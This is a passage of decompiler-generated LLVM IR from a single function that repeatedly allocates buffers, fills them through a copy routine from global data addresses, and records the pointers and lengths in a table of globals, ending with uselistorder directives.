  %v4_133e4 = call i32 @function_13a84(i32 %v1_133d4, i32 ptrtoint ([11 x i8]* @global_var_146b4.467 to i32), i32 %v0_133dc)
  %v0_133ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133ec, i32* @global_var_1ce44.468, align 4
  %v1_133f0 = trunc i32 %v0_133dc to i8
  store i8 %v1_133f0, i8* bitcast (i32* @global_var_1ce48.469 to i8*), align 4
  %v0_133f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_133f4 = trunc i32 %v0_133f4 to i8
  store i8 %v1_133f4, i8* bitcast (i32* @global_var_1ce49.470 to i8*), align 4
  %v1_133f8 = call i32 @_malloc(i32 33)
  store i32 %v1_133f8, i32* %r5.global-to-local, align 4
  %v3_13408 = call i32 @function_13a84(i32 %v1_133f8, i32 ptrtoint (i32* @global_var_146c0.472 to i32), i32 33)
  store i32 33, i32* %r3.global-to-local, align 4
  store i8 33, i8* bitcast (i32* @global_var_1ce50.473 to i8*), align 4
  %v0_13418 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13418, i32* @global_var_1ce4c.474, align 4
  %v0_1341c = load i32, i32* %r6.global-to-local, align 4
  %v1_1341c = trunc i32 %v0_1341c to i8
  store i8 %v1_1341c, i8* bitcast (i32* @global_var_1ce51.475 to i8*), align 4
  %v1_13420 = call i32 @_malloc(i32 8)
  store i32 %v1_13420, i32* %r5.global-to-local, align 4
  %v4_13430 = call i32 @function_13a84(i32 %v1_13420, i32 ptrtoint ([9 x i8]* @global_var_146e4.477 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1ce58.478 to i8*), align 4
  %v0_13440 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13440, i32* @global_var_1ce54.479, align 4
  %v0_13444 = load i32, i32* %r6.global-to-local, align 4
  %v1_13444 = trunc i32 %v0_13444 to i8
  store i8 %v1_13444, i8* bitcast (i32* @global_var_1ce59.480 to i8*), align 4
  %v1_13448 = call i32 @_malloc(i32 11)
  store i32 %v1_13448, i32* %r5.global-to-local, align 4
  %v4_13458 = call i32 @function_13a84(i32 %v1_13448, i32 ptrtoint ([12 x i8]* @global_var_146f0.482 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ce60.483 to i8*), align 4
  %v0_13468 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13468, i32* @global_var_1ce5c.484, align 4
  %v0_1346c = load i32, i32* %r6.global-to-local, align 4
  %v1_1346c = trunc i32 %v0_1346c to i8
  store i8 %v1_1346c, i8* bitcast (i32* @global_var_1ce61.485 to i8*), align 4
  %v1_13470 = call i32 @_malloc(i32 6)
  store i32 %v1_13470, i32* %r5.global-to-local, align 4
  %v4_13480 = call i32 @function_13a84(i32 %v1_13470, i32 ptrtoint ([7 x i8]* @global_var_146fc.487 to i32), i32 6)
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_13488 = load i32, i32* %r7.global-to-local, align 4
  store i8 6, i8* bitcast (i32* @global_var_1ce78.488 to i8*), align 4
  %v0_13490 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13490, i32* @global_var_1ce74.489, align 4
  %v0_13494 = load i32, i32* %r6.global-to-local, align 4
  %v1_13494 = trunc i32 %v0_13494 to i8
  store i8 %v1_13494, i8* bitcast (i32* @global_var_1ce79.490 to i8*), align 4
  %v1_13498 = call i32 @_malloc(i32 %v0_13488)
  %v0_1349c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13498, i32* %r5.global-to-local, align 4
  %v4_134a8 = call i32 @function_13a84(i32 %v1_13498, i32 ptrtoint ([8 x i8]* @global_var_14704.492 to i32), i32 %v0_1349c)
  %v0_134ac = load i32, i32* %r7.global-to-local, align 4
  %v0_134b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134b0, i32* @global_var_1ce7c.493, align 4
  %v1_134b4 = trunc i32 %v0_134ac to i8
  store i8 %v1_134b4, i8* bitcast (i32* @global_var_1ce80.494 to i8*), align 4
  %v0_134b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_134b8 = trunc i32 %v0_134b8 to i8
  store i8 %v1_134b8, i8* bitcast (i32* @global_var_1ce81.495 to i8*), align 4
  %v1_134bc = call i32 @_malloc(i32 %v0_134ac)
  %v0_134c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_134bc, i32* %r5.global-to-local, align 4
  %v4_134cc = call i32 @function_13a84(i32 %v1_134bc, i32 ptrtoint ([8 x i8]* @global_var_1470c.497 to i32), i32 %v0_134c0)
  %v0_134d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134d4, i32* @global_var_1ce84.498, align 4
  %v0_134d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_134d8 = trunc i32 %v0_134d8 to i8
  store i8 %v1_134d8, i8* bitcast (i32* @global_var_1ce88.499 to i8*), align 4
  %v0_134dc = load i32, i32* %r6.global-to-local, align 4
  %v1_134dc = trunc i32 %v0_134dc to i8
  store i8 %v1_134dc, i8* bitcast (i32* @global_var_1ce89.500 to i8*), align 4
  %v1_134e0 = call i32 @_malloc(i32 3)
  store i32 %v1_134e0, i32* %r5.global-to-local, align 4
  %v4_134f0 = call i32 @function_13a84(i32 %v1_134e0, i32 ptrtoint ([4 x i8]* @global_var_14714.502 to i32), i32 3)
  store i32 3, i32* %r3.global-to-local, align 4
  store i8 3, i8* bitcast (i32* @global_var_1ce90.503 to i8*), align 4
  %v0_13500 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13500, i32* @global_var_1ce8c.504, align 4
  %v0_13504 = load i32, i32* %r6.global-to-local, align 4
  %v1_13504 = trunc i32 %v0_13504 to i8
  store i8 %v1_13504, i8* bitcast (i32* @global_var_1ce91.505 to i8*), align 4
  %v1_13508 = call i32 @_malloc(i32 19)
  store i32 %v1_13508, i32* %r5.global-to-local, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_1351c = call i32 @function_13a84(i32 %v1_13508, i32 ptrtoint (i32* @global_var_14718.507 to i32), i32 19)
  %v0_13524 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13524, i32* @global_var_1ce94.508, align 4
  store i8 19, i8* bitcast (i32* @global_var_1ce98.509 to i8*), align 4
  %v0_1352c = load i32, i32* %r6.global-to-local, align 4
  %v1_1352c = trunc i32 %v0_1352c to i8
  store i8 %v1_1352c, i8* bitcast (i32* @global_var_1ce99.510 to i8*), align 4
  %v1_13530 = call i32 @_malloc(i32 24)
  store i32 %v1_13530, i32* %r5.global-to-local, align 4
  %v3_13540 = call i32 @function_13a84(i32 %v1_13530, i32 ptrtoint (i32* @global_var_1472c.512 to i32), i32 24)
  store i32 24, i32* %r3.global-to-local, align 4
  store i8 24, i8* bitcast (i32* @global_var_1cea0.513 to i8*), align 4
  %v0_13550 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13550, i32* @global_var_1ce9c.514, align 4
  %v0_13554 = load i32, i32* %r6.global-to-local, align 4
  %v1_13554 = trunc i32 %v0_13554 to i8
  store i8 %v1_13554, i8* bitcast (i32* @global_var_1cea1.515 to i8*), align 4
  %v1_13558 = call i32 @_malloc(i32 9)
  %v0_13564 = load i32, i32* %r7.global-to-local, align 4
  %v1_13564 = add i32 %v0_13564, 2
  store i32 %v1_13564, i32* %r7.global-to-local, align 4
  store i32 %v1_13558, i32* %r5.global-to-local, align 4
  %v4_1356c = call i32 @function_13a84(i32 %v1_13558, i32 ptrtoint ([10 x i8]* @global_var_14748.517 to i32), i32 9)
  %v0_13574 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13574, i32* @global_var_1cea4.518, align 4
  %v0_13578 = load i32, i32* %r7.global-to-local, align 4
  %v1_13578 = trunc i32 %v0_13578 to i8
  store i8 %v1_13578, i8* bitcast (i32* @global_var_1cea8.519 to i8*), align 4
  %v0_1357c = load i32, i32* %r6.global-to-local, align 4
  %v1_1357c = trunc i32 %v0_1357c to i8
  store i8 %v1_1357c, i8* bitcast (i32* @global_var_1cea9.520 to i8*), align 4
  %v1_13580 = call i32 @_malloc(i32 16)
  store i32 %v1_13580, i32* %r5.global-to-local, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_13594 = call i32 @function_13a84(i32 %v1_13580, i32 ptrtoint (i32* @global_var_14754.522 to i32), i32 16)
  %v0_1359c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1359c, i32* @global_var_1ceac.523, align 4
  store i8 16, i8* bitcast (i32* @global_var_1ceb0.524 to i8*), align 4
  %v0_135a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_135a4 = trunc i32 %v0_135a4 to i8
  store i8 %v1_135a4, i8* bitcast (i32* @global_var_1ceb1.525 to i8*), align 4
  %v1_135a8 = call i32 @_malloc(i32 22)
  store i32 %v1_135a8, i32* %r5.global-to-local, align 4
  %v3_135b8 = call i32 @function_13a84(i32 %v1_135a8, i32 ptrtoint (i32* @global_var_14768.527 to i32), i32 22)
  store i32 22, i32* %r3.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1ceb8.528 to i8*), align 4
  %v0_135c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135c8, i32* @global_var_1ceb4.529, align 4
  %v0_135cc = load i32, i32* %r6.global-to-local, align 4
  %v1_135cc = trunc i32 %v0_135cc to i8
  store i8 %v1_135cc, i8* bitcast (i32* @global_var_1ceb9.530 to i8*), align 4
  %v1_135d0 = call i32 @_malloc(i32 21)
  store i32 %v1_135d0, i32* %r5.global-to-local, align 4
  %v3_135e0 = call i32 @function_13a84(i32 %v1_135d0, i32 ptrtoint (i32* @global_var_14780.532 to i32), i32 21)
  store i32 21, i32* %r3.global-to-local, align 4
  store i8 21, i8* bitcast (i32* @global_var_1cec0.533 to i8*), align 4
  %v0_135f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135f0, i32* @global_var_1cebc.534, align 4
  %v0_135f4 = load i32, i32* %r6.global-to-local, align 4
  %v1_135f4 = trunc i32 %v0_135f4 to i8
  store i8 %v1_135f4, i8* bitcast (i32* @global_var_1cec1.535 to i8*), align 4
  %v1_135f8 = call i32 @_malloc(i32 17)
  store i32 %v1_135f8, i32* %r5.global-to-local, align 4
  %v4_13608 = call i32 @function_13a84(i32 %v1_135f8, i32 ptrtoint ([18 x i8]* @global_var_14798.537 to i32), i32 17)
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_13610 = load i32, i32* %r8.global-to-local, align 4
  store i8 17, i8* bitcast (i32* @global_var_1cec8.538 to i8*), align 4
  %v0_13618 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13618, i32* @global_var_1cec4.539, align 4
  %v0_1361c = load i32, i32* %r6.global-to-local, align 4
  %v1_1361c = trunc i32 %v0_1361c to i8
  store i8 %v1_1361c, i8* bitcast (i32* @global_var_1cec9.540 to i8*), align 4
  %v1_13620 = call i32 @_malloc(i32 %v0_13610)
  %v0_13628 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13620, i32* %r5.global-to-local, align 4
  %v3_13630 = call i32 @function_13a84(i32 %v1_13620, i32 ptrtoint (i32* @global_var_147ac.542 to i32), i32 %v0_13628)
  %v0_13638 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13638, i32* @global_var_1cecc.543, align 4
  %v1_1363c = trunc i32 %v0_13628 to i8
  store i8 %v1_1363c, i8* bitcast (i32* @global_var_1ced0.544 to i8*), align 4
  %v0_13640 = load i32, i32* %r6.global-to-local, align 4
  %v1_13640 = trunc i32 %v0_13640 to i8
  store i8 %v1_13640, i8* bitcast (i32* @global_var_1ced1.545 to i8*), align 4
  %v1_13644 = call i32 @_malloc(i32 23)
  store i32 %v1_13644, i32* %r5.global-to-local, align 4
  %v3_13654 = call i32 @function_13a84(i32 %v1_13644, i32 ptrtoint (i32* @global_var_147bc.547 to i32), i32 23)
  store i32 23, i32* %r3.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1ced8.548 to i8*), align 4
  %v0_13664 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13664, i32* @global_var_1ced4.549, align 4
  %v0_13668 = load i32, i32* %r6.global-to-local, align 4
  %v1_13668 = trunc i32 %v0_13668 to i8
  store i8 %v1_13668, i8* bitcast (i32* @global_var_1ced9.550 to i8*), align 4
  %v1_1366c = call i32 @_malloc(i32 83)
  store i32 %v1_1366c, i32* %r5.global-to-local, align 4
  %v3_1367c = call i32 @function_13a84(i32 %v1_1366c, i32 ptrtoint (i32* @global_var_147d4.552 to i32), i32 83)
  store i32 83, i32* %r3.global-to-local, align 4
  store i8 83, i8* bitcast (i32* @global_var_1cee0.553 to i8*), align 4
  %v0_1368c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1368c, i32* @global_var_1cedc.554, align 4
  %v0_13690 = load i32, i32* %r6.global-to-local, align 4
  %v1_13690 = trunc i32 %v0_13690 to i8
  store i8 %v1_13690, i8* bitcast (i32* @global_var_1cee1.555 to i8*), align 4
  %v1_13694 = call i32 @_malloc(i32 32)
  store i32 %v1_13694, i32* %r5.global-to-local, align 4
  %v3_136a4 = call i32 @function_13a84(i32 %v1_13694, i32 ptrtoint (i32* @global_var_14828.557 to i32), i32 32)
  store i32 32, i32* %r3.global-to-local, align 4
  store i8 32, i8* bitcast (i32* @global_var_1cee8.558 to i8*), align 4
  %v0_136b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136b4, i32* @global_var_1cee4.559, align 4
  %v0_136b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_136b8 = trunc i32 %v0_136b8 to i8
  store i8 %v1_136b8, i8* bitcast (i32* @global_var_1cee9.560 to i8*), align 4
  %v1_136bc = call i32 @_malloc(i32 48)
  store i32 %v1_136bc, i32* %r5.global-to-local, align 4
  %v3_136cc = call i32 @function_13a84(i32 %v1_136bc, i32 ptrtoint (i32* @global_var_1484c.562 to i32), i32 48)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_136d4 = load i32, i32* %r8.global-to-local, align 4
  store i8 48, i8* bitcast (i32* @global_var_1cef0.563 to i8*), align 4
  %v0_136dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136dc, i32* @global_var_1ceec.564, align 4
  %v0_136e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_136e0 = trunc i32 %v0_136e0 to i8
  store i8 %v1_136e0, i8* bitcast (i32* @global_var_1cef1.565 to i8*), align 4
  %v1_136e4 = call i32 @_malloc(i32 %v0_136d4)
  %v0_136ec = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_136e4, i32* %r5.global-to-local, align 4
  %v3_136f4 = call i32 @function_13a84(i32 %v1_136e4, i32 ptrtoint (i32* @global_var_14880.567 to i32), i32 %v0_136ec)
  %v0_136f8 = load i32, i32* %r7.global-to-local, align 4
  %v0_136fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136fc, i32* @global_var_1cef4.568, align 4
  %v1_13700 = trunc i32 %v0_136ec to i8
  store i8 %v1_13700, i8* bitcast (i32* @global_var_1cef8.569 to i8*), align 4
  %v0_13704 = load i32, i32* %r6.global-to-local, align 4
  %v1_13704 = trunc i32 %v0_13704 to i8
  store i8 %v1_13704, i8* bitcast (i32* @global_var_1cef9.570 to i8*), align 4
  %v1_13708 = call i32 @_malloc(i32 %v0_136f8)
  %v0_1370c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13708, i32* %r5.global-to-local, align 4
  %v3_13718 = call i32 @function_13a84(i32 %v1_13708, i32 ptrtoint (i32* @global_var_14890.572 to i32), i32 %v0_1370c)
  %v0_1371c = load i32, i32* %sl.global-to-local, align 4
  %v0_13720 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13720, i32* @global_var_1cefc.573, align 4
  %v0_13724 = load i32, i32* %r7.global-to-local, align 4
  %v1_13724 = trunc i32 %v0_13724 to i8
  store i8 %v1_13724, i8* bitcast (i32* @global_var_1cf00.574 to i8*), align 4
  %v0_13728 = load i32, i32* %r6.global-to-local, align 4
  %v1_13728 = trunc i32 %v0_13728 to i8
  store i8 %v1_13728, i8* bitcast (i32* @global_var_1cf01.575 to i8*), align 4
  %v1_1372c = call i32 @_malloc(i32 %v0_1371c)
  %v0_13734 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1372c, i32* %r5.global-to-local, align 4
  %v3_1373c = call i32 @function_13a84(i32 %v1_1372c, i32 ptrtoint (i32* @global_var_1489c.577 to i32), i32 %v0_13734)
  %v0_13740 = load i32, i32* %r8.global-to-local, align 4
  %v0_13744 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13744, i32* @global_var_1cf04.578, align 4
  %v1_13748 = trunc i32 %v0_13734 to i8
  store i8 %v1_13748, i8* bitcast (i32* @global_var_1cf08.579 to i8*), align 4
  %v0_1374c = load i32, i32* %r6.global-to-local, align 4
  %v1_1374c = trunc i32 %v0_1374c to i8
  store i8 %v1_1374c, i8* bitcast (i32* @global_var_1cf09.580 to i8*), align 4
  %v1_13750 = call i32 @_malloc(i32 %v0_13740)
  %v0_13758 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13750, i32* %r5.global-to-local, align 4
  %v3_13760 = call i32 @function_13a84(i32 %v1_13750, i32 ptrtoint (i32* @global_var_148a8.582 to i32), i32 %v0_13758)
  %v0_13764 = load i32, i32* %fp.global-to-local, align 4
  %v0_13768 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13768, i32* @global_var_1cf0c.583, align 4
  %v1_1376c = trunc i32 %v0_13758 to i8
  store i8 %v1_1376c, i8* bitcast (i32* @global_var_1cf10.584 to i8*), align 4
  %v0_13770 = load i32, i32* %r6.global-to-local, align 4
  %v1_13770 = trunc i32 %v0_13770 to i8
  store i8 %v1_13770, i8* bitcast (i32* @global_var_1cf11.585 to i8*), align 4
  %v1_13774 = call i32 @_malloc(i32 %v0_13764)
  %v0_1377c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_13774, i32* %r5.global-to-local, align 4
  %v3_13784 = call i32 @function_13a84(i32 %v1_13774, i32 ptrtoint (i32* @global_var_148b8.587 to i32), i32 %v0_1377c)
  %v0_13788 = load i32, i32* %sb.global-to-local, align 4
  %v0_1378c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1378c, i32* @global_var_1cf14.588, align 4
  %v1_13790 = trunc i32 %v0_1377c to i8
  store i8 %v1_13790, i8* bitcast (i32* @global_var_1cf18.589 to i8*), align 4
  %v0_13794 = load i32, i32* %r6.global-to-local, align 4
  %v1_13794 = trunc i32 %v0_13794 to i8
  store i8 %v1_13794, i8* bitcast (i32* @global_var_1cf19.590 to i8*), align 4
  %v1_13798 = call i32 @_malloc(i32 %v0_13788)
  %v0_137a0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_13798, i32* %r5.global-to-local, align 4
  %v3_137a8 = call i32 @function_13a84(i32 %v1_13798, i32 ptrtoint (i32* @global_var_148cc.592 to i32), i32 %v0_137a0)
  %v0_137b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137b0, i32* @global_var_1cf1c.593, align 4
  %v1_137b4 = trunc i32 %v0_137a0 to i8
  store i8 %v1_137b4, i8* bitcast (i32* @global_var_1cf20.594 to i8*), align 4
  %v0_137b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_137b8 = trunc i32 %v0_137b8 to i8
  store i8 %v1_137b8, i8* bitcast (i32* @global_var_1cf21.595 to i8*), align 4
  %v1_137bc = call i32 @_malloc(i32 8)
  store i32 %v1_137bc, i32* %r5.global-to-local, align 4
  %v4_137cc = call i32 @function_13a84(i32 %v1_137bc, i32 ptrtoint ([9 x i8]* @global_var_148e0.597 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cf28.598 to i8*), align 4
  %v0_137dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137dc, i32* @global_var_1cf24.599, align 4
  %v0_137e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_137e0 = trunc i32 %v0_137e0 to i8
  store i8 %v1_137e0, i8* bitcast (i32* @global_var_1cf29.600 to i8*), align 4
  %v1_137e4 = call i32 @_malloc(i32 11)
  store i32 %v1_137e4, i32* %r5.global-to-local, align 4
  %v3_137f4 = call i32 @function_13a84(i32 %v1_137e4, i32 ptrtoint (i32* @global_var_147c8.602 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_137fc = load i32, i32* %r8.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1cf30.603 to i8*), align 4
  %v0_13804 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13804, i32* @global_var_1cf2c.604, align 4
  %v0_13808 = load i32, i32* %r6.global-to-local, align 4
  %v1_13808 = trunc i32 %v0_13808 to i8
  store i8 %v1_13808, i8* bitcast (i32* @global_var_1cf31.605 to i8*), align 4
  %v1_1380c = call i32 @_malloc(i32 %v0_137fc)
  %v0_13814 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_1380c, i32* %r5.global-to-local, align 4
  %v3_1381c = call i32 @function_13a84(i32 %v1_1380c, i32 ptrtoint (i32* @global_var_148ec.607 to i32), i32 %v0_13814)
  %v0_13824 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13824, i32* @global_var_1cf34.608, align 4
  %v1_13828 = trunc i32 %v0_13814 to i8
  store i8 %v1_13828, i8* bitcast (i32* @global_var_1cf38.609 to i8*), align 4
  %v0_1382c = load i32, i32* %r6.global-to-local, align 4
  %v1_1382c = trunc i32 %v0_1382c to i8
  store i8 %v1_1382c, i8* bitcast (i32* @global_var_1cf39.610 to i8*), align 4
  %v1_13830 = call i32 @_malloc(i32 18)
  store i32 %v1_13830, i32* %r5.global-to-local, align 4
  %v3_13840 = call i32 @function_13a84(i32 %v1_13830, i32 ptrtoint (i32* @global_var_148fc.612 to i32), i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1cf40.613 to i8*), align 4
  %v0_13850 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13850, i32* @global_var_1cf3c.614, align 4
  %v0_13854 = load i32, i32* %r6.global-to-local, align 4
  %v1_13854 = trunc i32 %v0_13854 to i8
  store i8 %v1_13854, i8* bitcast (i32* @global_var_1cf41.615 to i8*), align 4
  %v1_13858 = call i32 @_malloc(i32 25)
  store i32 %v1_13858, i32* %r5.global-to-local, align 4
  %v3_13868 = call i32 @function_13a84(i32 %v1_13858, i32 ptrtoint (i32* @global_var_14910.617 to i32), i32 25)
  store i32 25, i32* %r3.global-to-local, align 4
  store i8 25, i8* bitcast (i32* @global_var_1cf48.618 to i8*), align 4
  %v0_13878 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13878, i32* @global_var_1cf44.619, align 4
  %v0_1387c = load i32, i32* %r6.global-to-local, align 4
  %v1_1387c = trunc i32 %v0_1387c to i8
  store i8 %v1_1387c, i8* bitcast (i32* @global_var_1cf49.620 to i8*), align 4
  %v1_13880 = call i32 @_malloc(i32 111)
  store i32 111, i32* %r5.global-to-local, align 4
  store i32 %v1_13880, i32* %r7.global-to-local, align 4
  %v3_13894 = call i32 @function_13a84(i32 %v1_13880, i32 ptrtoint (i32* @global_var_1492c.622 to i32), i32 111)
  %v0_13898 = load i32, i32* %r5.global-to-local, align 4
  %v0_1389c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1389c, i32* @global_var_1cf4c.623, align 4
  %v1_138a0 = trunc i32 %v0_13898 to i8
  store i8 %v1_138a0, i8* bitcast (i32* @global_var_1cf50.624 to i8*), align 4
  %v0_138a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_138a4 = trunc i32 %v0_138a4 to i8
  store i8 %v1_138a4, i8* bitcast (i32* @global_var_1cf51.625 to i8*), align 4
  %v1_138a8 = call i32 @_malloc(i32 %v0_13898)
  %v0_138ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_138a8, i32* %r7.global-to-local, align 4
  %v3_138b8 = call i32 @function_13a84(i32 %v1_138a8, i32 ptrtoint (i32* @global_var_1499c.627 to i32), i32 %v0_138ac)
  %v0_138c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_138c0, i32* @global_var_1cf54.628, align 4
  %v0_138c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_138c4 = trunc i32 %v0_138c4 to i8
  store i8 %v1_138c4, i8* bitcast (i32* @global_var_1cf58.629 to i8*), align 4
  %v0_138c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_138c8 = trunc i32 %v0_138c8 to i8
  store i8 %v1_138c8, i8* bitcast (i32* @global_var_1cf59.630 to i8*), align 4
  %v1_138cc = call i32 @_malloc(i32 110)
  %v0_138d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_138d0 = add i32 %v0_138d0, -1
  store i32 %v1_138d0, i32* %r5.global-to-local, align 4
  store i32 %v1_138cc, i32* %r7.global-to-local, align 4
  %v3_138e0 = call i32 @function_13a84(i32 %v1_138cc, i32 ptrtoint (i32* @global_var_14a0c.632 to i32), i32 %v1_138d0)
  %v0_138e4 = load i32, i32* %r5.global-to-local, align 4
  %v0_138e8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_138e8, i32* @global_var_1cf5c.633, align 4
  %v1_138ec = trunc i32 %v0_138e4 to i8
  store i8 %v1_138ec, i8* bitcast (i32* @global_var_1cf60.634 to i8*), align 4
  %v0_138f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_138f0 = trunc i32 %v0_138f0 to i8
  store i8 %v1_138f0, i8* bitcast (i32* @global_var_1cf61.635 to i8*), align 4
  %v1_138f4 = call i32 @_malloc(i32 %v0_138e4)
  %v0_138f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_138f4, i32* %r7.global-to-local, align 4
  %v3_13904 = call i32 @function_13a84(i32 %v1_138f4, i32 ptrtoint (i32* @global_var_14a7c.637 to i32), i32 %v0_138f8)
  %v0_1390c = load i32, i32* %r5.global-to-local, align 4
  %v1_1390c = trunc i32 %v0_1390c to i8
  store i8 %v1_1390c, i8* bitcast (i32* @global_var_1cf68.638 to i8*), align 4
  %v0_13910 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13910, i32* @global_var_1cf64.639, align 4
  %v0_13914 = load i32, i32* %r6.global-to-local, align 4
  %v1_13914 = trunc i32 %v0_13914 to i8
  store i8 %v1_13914, i8* bitcast (i32* @global_var_1cf69.640 to i8*), align 4
  %v1_13918 = call i32 @_malloc(i32 117)
  store i32 %v1_13918, i32* %r5.global-to-local, align 4
  %v3_13928 = call i32 @function_13a84(i32 %v1_13918, i32 ptrtoint (i32* @global_var_14aec.642 to i32), i32 117)
  store i32 117, i32* %r3.global-to-local, align 4
  %v0_13930 = load i32, i32* %r6.global-to-local, align 4
  %v1_13930 = trunc i32 %v0_13930 to i8
  %v2_13930 = load i32, i32* %r4.global-to-local, align 4
  %v3_13930 = add i32 %v2_13930, 413
  %v4_13930 = inttoptr i32 %v3_13930 to i8*
  store i8 %v1_13930, i8* %v4_13930, align 1
  %v0_13934 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13934, i32* @global_var_1cf6c.643, align 4
  %v0_13938 = load i32, i32* %r3.global-to-local, align 4
  %v1_13938 = trunc i32 %v0_13938 to i8
  store i8 %v1_13938, i8* bitcast (i32* @global_var_1cf70.644 to i8*), align 4
  %v2_1393c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1393c, i32* %r4.global-to-local, align 4
  ret i32 %v3_13928

; uselistorder directives
  uselistorder i32 %v1_138f4, { 1, 0 }
  uselistorder i32 %v1_138cc, { 1, 0 }
  uselistorder i32 %v1_138a8, { 1, 0 }
  uselistorder i32 %v1_13880, { 1, 0 }
  uselistorder i32 %v1_1380c, { 1, 0 }
  uselistorder i32 %v1_13798, { 1, 0 }
  uselistorder i32 %v1_13774, { 1, 0 }
  uselistorder i32 %v1_13750, { 1, 0 }
  uselistorder i32 %v1_1372c, { 1, 0 }
  uselistorder i32 %v1_13708, { 1, 0 }
  uselistorder i32 %v1_136e4, { 1, 0 }
  uselistorder i32 %v1_13620, { 1, 0 }
  uselistorder i32 %v1_13558, { 1, 0 }
  uselistorder i32 %v1_134bc, { 1, 0 }
  uselistorder i32 %v1_13498, { 1, 0 }
  uselistorder i32 %v1_133d4, { 1, 0 }
  uselistorder i32 %v1_133ac, { 1, 0 }
  uselistorder i32 %v1_13338, { 1, 0 }
  uselistorder i32 %v1_13298, { 1, 0 }
  uselistorder i32 %v1_13224, { 1, 0 }
  uselistorder i32 %v1_13200, { 1, 0 }
  uselistorder i32 %v1_131d8, { 1, 0 }
  uselistorder i32 %v1_131a4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 16, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29 }
